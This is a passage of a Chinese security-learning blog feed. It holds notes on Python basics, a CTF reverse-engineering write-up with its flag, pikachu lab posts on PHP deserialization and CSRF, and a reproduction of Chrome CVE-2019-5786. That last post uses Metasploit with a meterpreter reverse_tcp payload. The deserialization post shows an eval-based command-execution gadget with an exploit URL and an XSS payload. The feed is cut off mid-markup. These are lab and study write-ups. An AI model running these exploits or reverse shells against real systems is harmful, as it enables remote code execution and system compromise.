class="hljs-number">98.9</span><br>c=False<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(type(a)</span></span>,<span class="hljs-built_in">type</span>(b),<span class="hljs-built_in">type</span>(c))<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(str(a)</span></span>,<span class="hljs-built_in">str</span>(b),<span class="hljs-built_in">str</span>(c),<span class="hljs-built_in">type</span>(<span class="hljs-built_in">str</span>(a)),<span class="hljs-built_in">type</span>(<span class="hljs-built_in">str</span>(b)),<span class="hljs-built_in">type</span>(<span class="hljs-built_in">str</span>(c)))<br></code></pre></td></tr></tbody></table></figure><figure class="highlight clean"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">'int'</span>&gt; &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">'float'</span>&gt; &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">'bool'</span>&gt;<br><span class="hljs-number">10</span> <span class="hljs-number">98.9</span> <span class="hljs-literal">False</span> &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">'str'</span>&gt; &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">'str'</span>&gt; &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">'str'</span>&gt;<br></code></pre></td></tr></tbody></table></figure><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">s1=<span class="hljs-number">128</span><br>f1=<span class="hljs-number">98.7</span><br>s2=<span class="hljs-string">'76.77'</span><br>ff=True<br>s3=<span class="hljs-string">'hello'</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(int(s1)</span></span>,<span class="hljs-built_in">type</span>(<span class="hljs-built_in">int</span>(s1))) <span class="hljs-number">#128</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(int(f1)</span></span>,<span class="hljs-built_in">type</span>(<span class="hljs-built_in">int</span>(f1))) #<span class="hljs-number">98</span><br> <span class="hljs-selector-id">#print</span>(<span class="hljs-built_in">int</span>(s2),<span class="hljs-built_in">type</span>(<span class="hljs-built_in">int</span>(s2))) <span class="hljs-selector-id">#Error</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(int(ff)</span></span>,<span class="hljs-built_in">type</span>(<span class="hljs-built_in">int</span>(ff))) #<span class="hljs-number">1</span><br> <span class="hljs-selector-id">#print</span>(<span class="hljs-built_in">int</span>(s3),<span class="hljs-built_in">type</span>(<span class="hljs-built_in">int</span>(s3))) #Error<br></code></pre></td></tr></tbody></table></figure><figure class="highlight basic"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">128 </span>&lt;class <span class="hljs-comment">'int'&gt;</span><br><span class="hljs-symbol">98 </span>&lt;class <span class="hljs-comment">'int'&gt;</span><br><span class="hljs-symbol">1 </span>&lt;class <span class="hljs-comment">'int'&gt;</span><br></code></pre></td></tr></tbody></table></figure><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>单行：#</p><p>多行：三引号</p><p>中文编码声明： <code>#coding:utf-8</code></p><h2 id="输入函数input"><a href="#输入函数input" class="headerlink" title="输入函数input()"></a>输入函数input()</h2><p>接收用户输入，返回类型str，存储’=’</p><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p>1.算术运算符</p><p>加+  减-  乘*  除/  整除//  取余%  幂**</p><p>整除（一正一负向下取整）</p><p>取余（余数=被除数-除数*商）</p><p>2、赋值运算符 ‘=’</p><p>执行：从右至左；</p><p>+=、-=、*=、/=、//=、%=</p><pre><code class="hljs">a,b,c=10,20,30</code></pre><p><code>a+=30 # a=a+30</code></p><p>3.比较运算符 结果为bool</p><ul><li><blockquote><p>、&lt;、==、!=(不等于)、is、is not</p></blockquote></li><li>布尔：and,or,not,in,not in</li></ul><p>5.位运算符</p><p>与&amp; 11为1，否则为0</p><p>或| 00为0，否则为1</p><p>左移位&lt;&lt; 高位溢出舍弃，低位补0 （相当于乘2）</p><p>右移位&gt;&gt; 低位溢出舍弃，高位补0  （相当于除以2）</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">print</span>(<span class="hljs-number">4</span>&amp;<span class="hljs-number">8</span>) # <span class="hljs-number">0</span><br><span class="hljs-attribute">print</span>(<span class="hljs-number">4</span>|<span class="hljs-number">8</span>) # <span class="hljs-number">12</span><br><span class="hljs-attribute">print</span>(<span class="hljs-number">4</span>&lt;&lt;<span class="hljs-number">1</span>) #<span class="hljs-number">8</span><br><span class="hljs-attribute">print</span>(<span class="hljs-number">4</span>&gt;&gt;<span class="hljs-number">1</span>) #<span class="hljs-number">2</span><br><span class="hljs-attribute">print</span>(<span class="hljs-number">4</span>&lt;&lt;<span class="hljs-number">2</span>) #<span class="hljs-number">16</span><br><span class="hljs-attribute">print</span>(<span class="hljs-number">4</span>&gt;&gt;<span class="hljs-number">2</span>) #<span class="hljs-number">1</span><br></code></pre></td></tr></tbody></table></figure><p>6.优先级</p><p>算术&gt;位&gt;比较&gt;布尔&gt;赋值</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;输出函数print&quot;&gt;&lt;a href=&quot;#输出函数print&quot; class=&quot;headerlink&quot; title=&quot;输出函数print()&quot;&gt;&lt;/a&gt;输出函数print()&lt;/h2&gt;&lt;p&gt;1.可输出数字、字符串、表达式&lt;/p&gt;
&lt;figure class=&quot;hig</summary>
      
    
    
    
    
    <category term="python" scheme="https://sinky.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>SimpleRev</title>
    <link href="https://sinky.top/2022/08/10/SimpleRev-buu-Re/"/>
    <id>https://sinky.top/2022/08/10/SimpleRev-buu-Re/</id>
    <published>2022-08-10T02:14:24.700Z</published>
    <updated>2022-08-10T02:15:05.412Z</updated>
    
    <content type="html"><![CDATA[<p>IDA打开查看字符串，直接点进<code>Congratulation</code>找到关键函数<code>Decry()</code></p><p>浅分析一下</p><figure class="highlight plaintext"><figcaption><span>Decry()</span></figcaption><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs __int64">{<br>  char *v0; <br>  char v2; <br>  int v3; <br>  signed int v4; <br>  signed int i; <br>  signed int v6; <br>  char src[8]; <br>  __int64 v8; <br>  int v9; <br>  __int64 v10; <br>  __int64 v11; <br>  int v12; <br>  __int64 v13; <br>  v13 = *MK_FP(__FS__, 40LL);<br>  *(_QWORD *)src = 'SLCDN';<br>  v8 = 0LL;<br>  v9 = 0;<br>  v10 = 'wodah';<br>  v11 = 0LL;<br>  v12 = 0;<br>  LODWORD(v0) = join(key3, &amp;v10); <br>// 小端序存储，v10要倒过来看：text=killshadow<br>  text = v0;<br>  strcpy(key, key1);  <br>  strcat(key, src);  // key=ADSFKNDCLS<br>  v3 = 0;<br>  v4 = 0;<br>  getchar();<br>  v6 = strlen(key);<br>// for循环是为了大写变小写<br>  for ( i = 0; i &lt; v6; ++i )<br>  {<br>    if ( key[v4 % v6] &gt; 64 &amp;&amp; key[v4 % v6] &lt;= 90 )<br>      key[i] = key[v4 % v6] + 32;<br>    ++v4;<br>  }<br>  printf("Please input your flag:", src);<br>  while ( 1 )<br>  {<br>    v2 = getchar();<br>    if ( v2 == 10 )<br>      break;<br>    if ( v2 == 32 )<br>    {<br>      ++v3;<br>    }<br>    else<br>    {<br>      if ( v2 &lt;= 96 || v2 &gt; 122 )<br>      {<br>        if ( v2 &gt; 64 &amp;&amp; v2 &lt;= 90 )<br>          str2[v3] = (v2 - 39 - key[v4++ % v6] + 97) % 26 + 97;<br>      }<br>      else<br>      {<br>        str2[v3] = (v2 - 39 - key[v4++ % v6] + 97) % 26 + 97; //核心代码<br>      }<br>      if ( !(v4 % v6) )<br>        putchar(32);<br>      ++v3;<br>    }<br>  }<br>//经过加密后str2与text一致得到Congratulation，则加密前的str2就是flag<br>  if ( !strcmp(text, str2) )<br>    puts("Congratulation!\n");<br>  else<br>    puts("Try again!\n");<br>  return *MK_FP(__FS__, 40LL) ^ v13;<br>}<br></code></pre></td></tr></tbody></table></figure><p>有取余，没法逆推，用爆破：</p><figure class="highlight processing"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs processing">py脚本：<br><span class="hljs-built_in">key</span>=<span class="hljs-string">"ADSFKNDCLS"</span><br><span class="hljs-built_in">text</span>=<span class="hljs-string">"killshadow"</span><br>s=<span class="hljs-string">""</span><br>flag=<span class="hljs-string">""</span><br><span class="hljs-built_in">loop</span>=<span class="hljs-string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><br>v2 = <span class="hljs-number">0</span><br>v3 = <span class="hljs-number">0</span><br>v5 = <span class="hljs-title function_">len</span>(<span class="hljs-built_in">key</span>)<br><span class="hljs-keyword">for</span> i in <span class="hljs-title function_">range</span>(<span class="hljs-number">0</span>,v5):<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-title function_">ord</span>(<span class="hljs-built_in">key</span>[i]) &gt; <span class="hljs-number">64</span> and <span class="hljs-title function_">ord</span>(<span class="hljs-built_in">key</span>[i]) &lt;= <span class="hljs-number">90</span> ):<br>        s += <span class="hljs-title function_">chr</span>(<span class="hljs-title function_">ord</span>(<span class="hljs-built_in">key</span>[i]) + <span class="hljs-number">32</span>)<br>    <span class="hljs-keyword">else</span>:<br>        s +=<span class="hljs-built_in">key</span>[i]<br><span class="hljs-built_in">print</span>(s)<br><span class="hljs-keyword">for</span> i in <span class="hljs-title function_">range</span>(<span class="hljs-number">0</span>,<span class="hljs-title function_">len</span>(<span class="hljs-built_in">text</span>)):<br>    <span class="hljs-keyword">for</span> j in <span class="hljs-built_in">loop</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-title function_">ord</span>(<span class="hljs-built_in">text</span>[i])==(<span class="hljs-title function_">ord</span>(j)<span class="hljs-number">-39</span>-<span class="hljs-title function_">ord</span>(s[i])+<span class="hljs-number">97</span>)%<span class="hljs-number">26</span>+<span class="hljs-number">97</span>:<br>            flag+=j<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs C语言脚本"> #include&lt;stdio.h&gt; <br>int main()<br>{<br>char key[] = "adsfkndcls";<br>char text[] = "killshadow";<br>int i;<br>int v3=10;//长度 <br>for (int i = 0; i &lt; 10; i++)<br>{<br>for (int j = 0; j &lt; 128; j++)<br>{<br>if (j &lt; 'A' || j &gt; 'z' || j &gt; 'Z' &amp;&amp; j &lt; 'a')<br>{<br>continue;<br>}<br>if ((j - 39 - key[v3 % 10] + 97) % 26 + 97 == text[i])<br>{<br>printf("%c",j);<br>v3++;<br>break;<br>}<br>}<br>}<br>}<br></code></pre></td></tr></tbody></table></figure><pre><code class="hljs">flag{KLDQCUDFZO}</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;IDA打开查看字符串，直接点进&lt;code&gt;Congratulation&lt;/code&gt;找到关键函数&lt;code&gt;Decry()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;浅分析一下&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;figcaption&gt;&lt;sp</summary>
      
    
    
    
    
    <category term="Re" scheme="https://sinky.top/tags/Re/"/>
    
    <category term="Buu" scheme="https://sinky.top/tags/Buu/"/>
    
    <category term="CTF" scheme="https://sinky.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化</title>
    <link href="https://sinky.top/2022/08/09/pikachu-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://sinky.top/2022/08/09/pikachu-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2022-08-09T09:01:18.129Z</published>
    <updated>2022-08-11T14:18:28.118Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="序列化-serialize"><a href="#序列化-serialize" class="headerlink" title="序列化 serialize()"></a>序列化 serialize()</h2><p>序列化：把一个对象变成可以传输的字符串。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs <?php">class S{<br>public $test="pikachu";<br>}<br>$s=new S;//创建一个对象<br>serialize($s);//把这个对象进行序列化<br>?&gt;<br></code></pre></td></tr></tbody></table></figure><p>结果：O:1:”S”:1:{s:4:”test”;s:7:”pikachu”;}</p><p>O:代表object</p><p>1:代表对象名字长度为一个字符</p><p>S:对象的名称</p><p>1:代表对象里面有一个变量</p><p>s:数据类型</p><p>4:变量名称的长度</p><p>test:变量名称</p><p>s:数据类型</p><p>7:变量值的长度</p><p>pikachu:变量值</p><p>（什么鬼，没懂）</p><h2 id="反序列化-unserialize"><a href="#反序列化-unserialize" class="headerlink" title="反序列化 unserialize()"></a>反序列化 unserialize()</h2><p>就是把序列化的字符串还原为对象，然后在接下来的代码中继续使用。</p><pre><code class="hljs">$u=unserialize("0:1:"S":1{s:4:"test":s:7:"pikachu";}");echo $u ‐&gt; test;//得到结果为pikachu</code></pre><p>序列化和反序列化本身没有问题，但如果反序列化的内容是用户可以控制的，且后台不正当的使用了PHP中的魔法函数，就会导致安全问题。</p><p><img src="https://s2.loli.net/2022/08/09/LkvmjC2rTAON7Pi.png" alt="image.png"></p><ul><li>常见的魔法函数：<ul><li><em>__construct()</em> 当一个对象创建时被调用</li><li><em>__destruct()</em> 当一个对象销毁时被调用</li><li><em>__toString()</em> 当一个对象被当作一个字符串使用</li><li><em>__sleep()</em> 在对象在被序列化之前运行</li><li><em>__wakeuop</em> 将在序列化之后立即被调用</li></ul></li></ul><h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs <?php">//定义类<br>class test<br>{<br>//在对象被销毁时候自动调用destruct函数<br>function __destruct()<br>{<br>echo "&lt;br&gt;__destruct()&lt;br&gt;";<br>//在此函数中添加eval()以达到命令执行的目的<br>eval($_GET['cmd']);<br>}<br>}<br>//echo serialize($test);方便将序列化后的test写进u参数中传参<br>$test = new test;<br>echo serialize($test);<br>//执行完这个echo后会被垃圾回收器回收，也就是销毁<br>unserialize($_GET['u']);<br>//反序列化执行完后又会被回收<br>// 所以会出现两次destruct<br>?&gt;<br></code></pre></td></tr></tbody></table></figure><p><img src="https://s2.loli.net/2022/08/09/obFRtxqgIyXBO9k.png" alt="image.png"></p><p>传参: <code>http://localhost/phptest.php?O:4:"test":0:{}&amp;cmd=system("woami");</code></p><p>利用成功。</p><h1 id="php反序列化漏洞"><a href="#php反序列化漏洞" class="headerlink" title="php反序列化漏洞"></a>php反序列化漏洞</h1><p><img src="https://s2.loli.net/2022/08/09/cl6J2puye5PkzTL.png" alt="image.png"></p><p>随便提交点啥字符串，提示“大兄弟，来点劲爆点儿的”</p><p>提交了一串序列化字符串，回显是反序列化后的。没啥思路，看一下后台代码。</p><p><img src="https://s2.loli.net/2022/08/09/F58nRZDKNG4VSXi.png" alt="image.png"></p><p>将XSS字符串 <code>&lt;script&gt;alert('xss')&lt;/script&gt; </code>序列化一下： <code>O:1:"S":1:{s:4:"test";s:29:"&lt;script&gt;alert('xss')&lt;/script&gt;";}</code></p><p>提交，成功</p><p><img src="https://s2.loli.net/2022/08/09/TVb9AHiwgLo812t.png" alt="image.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;h2 id=&quot;序列化-serialize&quot;&gt;&lt;a href=&quot;#序列化-serialize&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    
    <category term="WEB" scheme="https://sinky.top/tags/WEB/"/>
    
    <category term="pikachu" scheme="https://sinky.top/tags/pikachu/"/>
    
  </entry>
  
  <entry>
    <title>pikachu-CSRF</title>
    <link href="https://sinky.top/2022/08/09/pikachu-CSRF/"/>
    <id>https://sinky.top/2022/08/09/pikachu-CSRF/</id>
    <published>2022-08-09T08:30:06.517Z</published>
    <updated>2022-08-09T08:51:43.331Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>CSRF 跨站请求伪造，在csrf攻击场景中攻击者会伪造一个请求，欺骗目标用户进行点击，用户一旦点击这个请求，整个攻击就完成了，所以csrf攻击也成为”one click”攻击.</p><h2 id="csrf攻击满足的条件"><a href="#csrf攻击满足的条件" class="headerlink" title="csrf攻击满足的条件"></a>csrf攻击满足的条件</h2><p>1、网站没有对个人的信息修改的请求进行防csrf处理，导致请求容易被伪造</p><p>2.用户在登录后台的情况下，点击了攻击者发送的链接，如果用户没登陆或没点连接都不会成</p><h2 id="csrf与xss的区别"><a href="#csrf与xss的区别" class="headerlink" title="csrf与xss的区别"></a>csrf与xss的区别</h2><p>csrf是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而xss是直接盗取到了用户的权限，然后实施破坏。</p><h2 id="如何确认一个web系统存在csrf漏洞"><a href="#如何确认一个web系统存在csrf漏洞" class="headerlink" title="如何确认一个web系统存在csrf漏洞"></a>如何确认一个web系统存在csrf漏洞</h2><p>1.对目标网站增删改的地方进行标记，并观察其逻辑，判断请求是否可以被伪造</p><ul><li>修改管理员账号时，并不需要验证旧密码，导致请求容易被伪造；</li><li>对于敏感信息的修改并没有使用安全的token验证，导致请求容易被伪造；</li></ul><p>2.确认凭证的有效期</p><ul><li>虽然退出或关闭了浏览器，但cookie仍然有效，或者session并没有及时国企，导致csrf攻击变得简单。</li></ul><h1 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h1><p>登录账号，抓取修改个人信息流量包。</p><p><img src="https://s2.loli.net/2022/08/09/S596iH2b7vKtPh3.png" alt="image.png"></p><p>发现参数可以直接被修改，未做任何确认机制，可以直接将url伪装成各种html让受害者点击。</p><p>可以构造出CSRF攻击URL,诱使登录状态的用户点击url就可以完成CSRF攻击。</p><p>如果修改信息的请求方式是POST型的，攻击者则不能通过构造恶意url来攻击。类似于xss的post型攻击，攻击者会构造一个自己的攻击站点（服务器），站点上有一个poat.html，诱使用户点击该地址。当用户点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息，从而完成攻击。</p><p>步骤同get。</p><p>正常登录状态：</p><p><img src="https://s2.loli.net/2022/08/09/noayh3NpcmPvMXq.png" alt="image.png"></p><p>点击恶意url后，用户信息直接被修改</p><p><img src="https://s2.loli.net/2022/08/09/usMpORoFZEmjqng.png" alt="image.png"></p><h1 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF(Token)"></a>CSRF(Token)</h1><p>token: 每次请求都增加一个随机码（需要够随机，不容易被伪造），后台每次对这个随机码进行验证，这个随机码就是token。</p><p>如图获取修改信息流量包后发现增加了token，无法利用。</p><p><img src="https://s2.loli.net/2022/08/09/quSRzMEXBvVwPnK.png" alt="image.png"></p><h1 id="防范CSRF措施"><a href="#防范CSRF措施" class="headerlink" title="防范CSRF措施"></a>防范CSRF措施</h1><ul><li>增加token验证：对关键操作增加token参数，token值必须随机，每次都不一样</li><li>安全的会话管理（避免会话被利用）<ul><li>不要再客户端保存敏感信息（身份认证信息）</li><li>测试直接关闭，退出时的会话过期机制（一般是15-20分钟），无操作则自动登入超时。</li></ul></li><li>访问控制安全管理<ul><li>敏感信息修改时需要对身份进行二次认证（如修改账号时需要判断旧密码）</li><li>敏感信息的修改尽量使用post（post安全性高于get）</li><li>通过http头部中的referer来限制页面（修改个人信息的referer必须来自本域，不可来自其他域或无referer）</li></ul></li><li>增加验证码：一般用在登录（防暴力破解），也可用于其他重要信息操作的表单中。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CSRF&quot;&gt;&lt;a href=&quot;#CSRF&quot; class=&quot;headerlink&quot; title=&quot;CSRF&quot;&gt;&lt;/a&gt;CSRF&lt;/h1&gt;&lt;p&gt;CSRF 跨站请求伪造，在csrf攻击场景中攻击者会伪造一个请求，欺骗目标用户进行点击，用户一旦点击这个请求，整个攻击就完成</summary>
      
    
    
    
    
    <category term="pikachu" scheme="https://sinky.top/tags/pikachu/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-5786</title>
    <link href="https://sinky.top/2022/08/09/CVE-2019-5786/"/>
    <id>https://sinky.top/2022/08/09/CVE-2019-5786/</id>
    <published>2022-08-09T08:02:35.739Z</published>
    <updated>2022-08-09T08:03:08.820Z</updated>
    
    <content type="html"><![CDATA[<p>前言：</p><p>这个漏洞是我第一个自己进行复现和尝试写exp的洞，我希望在未来我能够对于复现漏洞和写exp能像吃饭喝水一样自信！加油！</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>kali</p><p>win7_x86</p><p>Google_chrome_(32bit)_v72.0.3626.119</p><p>浏览下载链接推荐：<a href="https://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe">https://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe</a></p><h2 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h2><p>kali启动msf,搜索chrome_filereader利用模块。(据谷歌官方公示，CVE-2019-5786是位于FileReader中的UAF漏洞)</p><pre><code class="hljs">root@kali:~# msfconsole -qmsf5 &gt; search chrome_filereader</code></pre><blockquote><p>注：<br>1.<code>msfconsole -q</code>  是指启动工具msf，-q 不打印没用的东西出来（msf启动界面）之后可能需要专门整理一下有关msf工具的知识。<br>2.<code>search chrome_filereader</code>正则匹配搜索exp。exp存在则浮现。<br>3.什么是UAF漏洞：内存破坏漏洞，通常存在于浏览器中，详细可见博客文章“UAF漏洞简单学习”</p></blockquote><p>出现exp: <code>exploit/filereader/browser/chrome_filereader_uaf</code></p><p><img src="https://i.loli.net/2020/05/25/IcHhEGVmKiTvxyz.png" alt="捕获.PNG"></p><h3 id="简单了解FileReader对象的用法"><a href="#简单了解FileReader对象的用法" class="headerlink" title="简单了解FileReader对象的用法"></a>简单了解FileReader对象的用法</h3><p>Filereader 可以实现对文件内容或者缓冲区数（Blob）的异步读取</p><ul><li><p>readyState：表示读取状态</p><ul><li>empty,0,尚未读取</li><li>loading,1,正在读取</li><li>done,2,读取完成</li></ul></li><li><p>result：表示读取结果，具体格式与读取方式有关：</p><ul><li>readAsArrayBuffer</li><li>readAsBinaryString</li><li>readAsDataURL</li><li>readAsText</li></ul></li><li><p>onprogress：回调函数</p><ul><li>读取Blob触发</li><li>当数据较多时会周期性触发多次</li></ul></li><li><p>onloadend：回调函数</p><ul><li>读取操作完成时触发，不论读取成功或失败</li></ul></li></ul><p>查看模块信息</p><p><img src="https://i.loli.net/2020/05/25/dT2WQNsPg4qaBZH.png" alt="捕获.PNG"></p><p>漏洞介绍：</p><figure class="highlight livecodeserver"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Payload information:<br>Description:<br>  This exploit takes advantage <span class="hljs-keyword">of</span> <span class="hljs-keyword">a</span> use <span class="hljs-keyword">after</span> free vulnerability <span class="hljs-keyword">in</span> <br>  Google Chrome <span class="hljs-number">72.0</span><span class="hljs-number">.3626</span><span class="hljs-number">.119</span> running <span class="hljs-keyword">on</span> <span class="hljs-title">Windows</span> <span class="hljs-title">7</span> <span class="hljs-title">x86</span>. <span class="hljs-title">The</span> <br>  FileReader.readAsArrayBuffer <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">can</span> <span class="hljs-title">return</span> <span class="hljs-title">multiple</span> <span class="hljs-title">references</span> </span><br>  <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> same ArrayBuffer object, which can be freed <span class="hljs-keyword">and</span> overwritten <br>  <span class="hljs-keyword">with</span> sprayed objects. The dangling ArrayBuffer reference can be used <br>  <span class="hljs-built_in">to</span> access <span class="hljs-keyword">the</span> sprayed objects, allowing arbitrary memory access <span class="hljs-built_in">from</span> <br>  Javascript. This is used <span class="hljs-built_in">to</span> <span class="hljs-built_in">write</span> <span class="hljs-keyword">and</span> execute shellcode <span class="hljs-keyword">in</span> <span class="hljs-keyword">a</span> <br>  WebAssembly object. The shellcode is executed <span class="hljs-keyword">within</span> <span class="hljs-keyword">the</span> Chrome <br>  sandbox, so you must explicitly disable <span class="hljs-keyword">the</span> sandbox <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> payload <br>  <span class="hljs-built_in">to</span> be successful.<br></code></pre></td></tr></tbody></table></figure><p>选择payload</p><pre><code class="hljs">-&gt; set payload windows/meterpreter/reverse_tcp</code></pre><blockquote><p>注：meterpreter/reverse_tcp：基于TCP的反向链接反弹shell，详细见文章“初识Meterpreter”</p></blockquote><p>设置payload参数：LHOST为kali ip</p><pre><code class="hljs">-&gt; set LHOST 192.168.119.128</code></pre><p><img src="https://i.loli.net/2020/05/25/chvQmOGL1Kqgebs.png" alt="捕获.PNG"></p><p>创建服务 <code>-&gt; set payload windows/meterpreter/reverse_tcp</code></p><p><img src="https://i.loli.net/2020/05/25/bNlUIHPxwkXcsrn.png" alt="捕获.PNG"></p><p>启动服务：run 或者exploit</p><p>在win7下进入chrome文件目录，在目录下进去cmd，并以沙箱关闭状态执行chrome.exe</p><pre><code class="hljs">-&gt; chrome.exe --no-sandbox</code></pre><p>在弹出的chome浏览器中访问kali ip: <a href="http://192.168.119.128:8080/">http://192.168.119.128:8080</a></p><p>kali获得sessions<br>查看sessions序号，通过反弹shell在win7上可执行命令。<br>复现结束。</p><h3 id="后记"><a href="#后记" class="headerlink" 